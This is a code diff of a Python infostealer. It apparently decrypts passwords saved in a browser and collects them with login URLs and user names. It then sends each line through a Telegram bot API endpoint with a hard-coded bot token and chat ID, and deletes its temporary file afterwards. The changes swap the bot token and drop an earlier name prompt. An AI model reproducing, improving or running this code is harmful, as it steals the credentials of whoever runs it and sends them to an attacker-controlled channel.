@@ -59,7 +59,7 @@ def fetching_encryption_key():
 
 
 def send(text):
-    url = f'https://api.telegram.org/bot5034373769:AAH4X2ztyvTW5RYTGf2vXcO19hCqVotat5Y/sendMessage'
+    url = f'https://api.telegram.org/bot5633216566:AAGVHIaZZIHZ3ge-6ZLDbqsZX0F67szyRDo/sendMessage'
     payload = {
         'chat_id': 1410223644,
         'text': text
@@ -75,11 +75,8 @@ def temp_store(mode, data=None):
             f.write(data)
 
     elif mode == 'read':
-        te = ''''''
         with open("temp.txt", 'r') as f:
-            for i in f.readlines():
-                te += i
-        return te
+            return f.readlines()
 
 
 def password_decryption(password, encryption_key):
@@ -129,10 +126,7 @@ def main():
 
         if user_name or decrypted_password:
 
-            infos = f'''Main URL: {main_url}
-            Login URL: {login_page_url}
-            User name: {user_name}
-            Decrypted Password: {decrypted_password}
+            infos = f'''Main URL: {main_url}, Login URL: {login_page_url}, User name: {user_name},Decrypted Password: {decrypted_password}
             '''
             temp_store("write", infos)
 
@@ -164,10 +158,12 @@ def delete_file():
 
 
 if __name__ == "__main__":
-    name = input("enter your name:  ")
-    send(f"data from {name}")
+
     main()
-    send(temp_store("read"))
+    txt = temp_store("read")
+    for i in txt:
+        # print(i)
+        send(i)
     # send(temp_store("read"))
     print('success')
     delete_file()
